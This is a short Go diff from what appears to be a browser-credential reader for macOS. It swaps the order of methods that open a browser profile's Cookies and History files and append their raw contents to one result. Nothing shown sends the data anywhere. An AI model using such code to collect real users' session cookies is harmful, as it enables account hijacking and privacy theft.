@@ -28,8 +28,8 @@ return "", err
 return string(buf[:n]), nil
 }
 
-func (m *MacBrowserCred) ReadHistory() (string, error) {
-file, err := os.Open(m.Path + "/History")
+func (m *MacBrowserCred) ReadCookies() (string, error) {
+file, err := os.Open(m.Path + "/Cookies")
 if err != nil {
 return "", err
 }
@@ -42,8 +42,8 @@ return "", err
 return string(buf[:n]), nil
 }
 
-func (m *MacBrowserCred) ReadCookies() (string, error) {
-file, err := os.Open(m.Path + "/Cookies")
+func (m *MacBrowserCred) ReadHistory() (string, error) {
+file, err := os.Open(m.Path + "/History")
 if err != nil {
 return "", err
 }
@@ -63,15 +63,15 @@ if err != nil {
 return "", err
 }
 result += data
-history, err := m.ReadHistory()
-if err != nil {
-return "", err
-}
-result += history
 cookies, err := m.ReadCookies()
 if err != nil {
 return "", err
 }
 result += cookies
+history, err := m.ReadHistory()
+if err != nil {
+return "", err
+}
+result += history
 return result, nil
 }
